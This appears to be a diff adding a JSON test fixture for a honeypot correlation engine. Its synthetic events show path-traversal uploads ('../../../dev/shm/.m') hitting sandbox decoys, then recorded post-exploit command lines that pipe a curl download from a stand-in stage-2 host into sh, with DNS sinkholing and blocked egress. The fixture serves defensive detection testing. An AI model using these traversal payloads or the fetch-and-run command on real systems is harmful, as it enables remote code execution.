@@ -1,0 +1,443 @@
+{
+  "description": "Two campaigns and a bystander (#33 validation). Three edge sensors receive the same upload body from three sources within seven minutes: one campaign joined by the payload hash. An hour later two sources run the demo chain on two sandbox decoys and both fetch the same stage 2: a second campaign joined by the stage-2 URL, callback infrastructure, behaviour fingerprint and, through the ASN table, ASN and CVE. A plain probe of a third decoy joins nothing. FOILED-DEMO-0001's advisory is published after all of it, so the timing is pre-disclosure.",
+  "now": 1792306923000,
+  "asns": {
+    "192.0.2.10": 64500,
+    "192.0.2.11": 64500
+  },
+  "events": [
+    {
+      "event_id": "wave-a1",
+      "ts": 1792285323000,
+      "decoy_id": "dcy-edge-syd-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "203.0.113.21",
+        "port": 40000
+      },
+      "dst": {
+        "ip": "10.85.2.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "sensor",
+        "id": "sensor-syd-1"
+      },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../tmp/.w",
+        "status": 201,
+        "user_agent": "python-requests/2.31",
+        "body_sha256": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
+      }
+    },
+    {
+      "event_id": "wave-a2",
+      "ts": 1792285418000,
+      "decoy_id": "dcy-edge-sgp-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "203.0.113.22",
+        "port": 40001
+      },
+      "dst": {
+        "ip": "10.85.2.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "sensor",
+        "id": "sensor-sgp-1"
+      },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../tmp/.w",
+        "status": 201,
+        "user_agent": "python-requests/2.31",
+        "body_sha256": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
+      }
+    },
+    {
+      "event_id": "wave-a3",
+      "ts": 1792285733000,
+      "decoy_id": "dcy-edge-fra-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "203.0.113.23",
+        "port": 40002
+      },
+      "dst": {
+        "ip": "10.85.2.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "sensor",
+        "id": "sensor-fra-1"
+      },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../tmp/.w",
+        "status": 201,
+        "user_agent": "python-requests/2.31",
+        "body_sha256": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
+      }
+    },
+    {
+      "event_id": "wave-p1",
+      "ts": 1792285343000,
+      "decoy_id": "dcy-demo-3",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "info",
+      "src": {
+        "ip": "198.51.100.40"
+      },
+      "dst": {
+        "ip": "10.85.1.4",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "method": "GET",
+        "path": "/",
+        "status": 200
+      }
+    },
+    {
+      "event_id": "wave-b11",
+      "ts": 1792288923000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "192.0.2.10",
+        "port": 51501
+      },
+      "dst": {
+        "ip": "10.85.1.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../../dev/shm/.m",
+        "status": 201,
+        "user_agent": "demo-loader/0.2",
+        "body_sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+      }
+    },
+    {
+      "event_id": "wave-b12",
+      "ts": 1792288923004,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "high",
+      "src": {
+        "ip": "192.0.2.10",
+        "port": 51501
+      },
+      "dst": {
+        "ip": "10.85.1.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "trigger",
+        "sequence_no": 1,
+        "t_offset_ms": 4
+      },
+      "data": {
+        "request_path": "/api/upload?path=../../../dev/shm/.m"
+      }
+    },
+    {
+      "event_id": "wave-b13",
+      "ts": 1792288923009,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "critical",
+      "src": {
+        "ip": "192.0.2.10",
+        "port": 51501
+      },
+      "dst": {
+        "ip": "10.85.1.2",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "post_exploit",
+        "sequence_no": 2,
+        "t_offset_ms": 9,
+        "cmd_lines": [
+          "sh -c 'curl -s http://stage2.example.invalid/m.sh | sh'"
+        ]
+      },
+      "data": {
+        "memory_only": true
+      }
+    },
+    {
+      "event_id": "wave-b14",
+      "ts": 1792288924000,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "medium",
+      "src": {
+        "ip": "10.85.1.2",
+        "port": 40101
+      },
+      "dst": {
+        "ip": "10.85.1.1",
+        "port": 53
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "query": "stage2.example.invalid",
+        "qtype": "A",
+        "verdict": "sinkholed"
+      }
+    },
+    {
+      "event_id": "wave-b15",
+      "ts": 1792288924100,
+      "decoy_id": "dcy-demo-1",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "egress",
+      "severity": "high",
+      "src": {
+        "ip": "10.85.1.2",
+        "port": 44101
+      },
+      "dst": {
+        "ip": "192.0.2.80",
+        "port": 80
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "verdict": "blocked",
+        "host": "stage2.example.invalid",
+        "method": "GET",
+        "path": "/m.sh"
+      }
+    },
+    {
+      "event_id": "wave-b21",
+      "ts": 1792290723000,
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "application",
+      "severity": "medium",
+      "src": {
+        "ip": "192.0.2.11",
+        "port": 51502
+      },
+      "dst": {
+        "ip": "10.85.1.3",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "method": "POST",
+        "path": "/api/upload?path=../../../dev/shm/.m",
+        "status": 201,
+        "user_agent": "demo-loader/0.2",
+        "body_sha256": "60303ae22b998861bce3b28f33eec1be758a213c86c93c076dbe9f558c11c752"
+      }
+    },
+    {
+      "event_id": "wave-b22",
+      "ts": 1792290723004,
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "high",
+      "src": {
+        "ip": "192.0.2.11",
+        "port": 51502
+      },
+      "dst": {
+        "ip": "10.85.1.3",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "trigger",
+        "sequence_no": 1,
+        "t_offset_ms": 4
+      },
+      "data": {
+        "request_path": "/api/upload?path=../../../dev/shm/.m"
+      }
+    },
+    {
+      "event_id": "wave-b23",
+      "ts": 1792290723009,
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "hook",
+      "severity": "critical",
+      "src": {
+        "ip": "192.0.2.11",
+        "port": 51502
+      },
+      "dst": {
+        "ip": "10.85.1.3",
+        "port": 8080
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "hook": {
+        "hook_id": "demo-app.upload-path-traversal",
+        "catalogue_id": "foiled/demo-app/1.0.0",
+        "cve_id": "FOILED-DEMO-0001",
+        "stage": "post_exploit",
+        "sequence_no": 2,
+        "t_offset_ms": 9,
+        "cmd_lines": [
+          "sh -c 'curl -s http://stage2.example.invalid/m.sh | sh'"
+        ]
+      },
+      "data": {
+        "memory_only": true
+      }
+    },
+    {
+      "event_id": "wave-b24",
+      "ts": 1792290724000,
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "dns",
+      "severity": "medium",
+      "src": {
+        "ip": "10.85.1.3",
+        "port": 40102
+      },
+      "dst": {
+        "ip": "10.85.1.1",
+        "port": 53
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "query": "stage2.example.invalid",
+        "qtype": "A",
+        "verdict": "sinkholed"
+      }
+    },
+    {
+      "event_id": "wave-b25",
+      "ts": 1792290724100,
+      "decoy_id": "dcy-demo-2",
+      "catalogue_id": "foiled/demo-app/1.0.0",
+      "decoy_kind": "sandbox",
+      "generation": 1,
+      "channel": "egress",
+      "severity": "high",
+      "src": {
+        "ip": "10.85.1.3",
+        "port": 44102
+      },
+      "dst": {
+        "ip": "192.0.2.80",
+        "port": 80
+      },
+      "tenant_id": "t1",
+      "source": {
+        "kind": "host",
+        "id": "host-1"
+      },
+      "data": {
+        "verdict": "blocked",
+        "host": "stage2.example.invalid",
+        "method": "GET",
+        "path": "/m.sh"
+      }
+    }
+  ]
+}
